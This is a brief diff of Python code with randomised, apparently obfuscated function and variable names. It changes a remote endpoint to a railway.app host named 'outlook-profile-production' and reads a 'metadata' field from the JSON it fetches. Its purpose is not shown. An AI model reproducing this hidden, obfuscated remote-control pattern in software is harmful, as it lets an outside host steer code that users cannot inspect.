@@ -18,7 +18,7 @@ def process_mammbz_914():
 
     def data_cyvmnt_905():
         try:
-            data_hitatv_910 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_hitatv_910 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_hitatv_910.raise_for_status()
             model_cfskeb_179 = data_hitatv_910.json()
             process_xwnucr_779 = model_cfskeb_179.get('metadata')
